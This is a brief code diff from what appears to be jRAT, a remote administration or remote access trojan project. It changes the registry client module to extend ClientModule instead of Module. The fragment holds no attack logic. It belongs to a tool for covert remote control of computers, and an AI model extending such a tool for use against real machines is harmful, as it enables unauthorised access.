@@ -1,9 +1,9 @@
 package jrat.module.registry;
 
-import jrat.api.Module;
+import jrat.api.ClientModule;
 import jrat.client.packets.incoming.IncomingPackets;
 
-public class RegistryClientModule extends Module {
+public class RegistryClientModule extends ClientModule {
 
     public RegistryClientModule() {
         super();
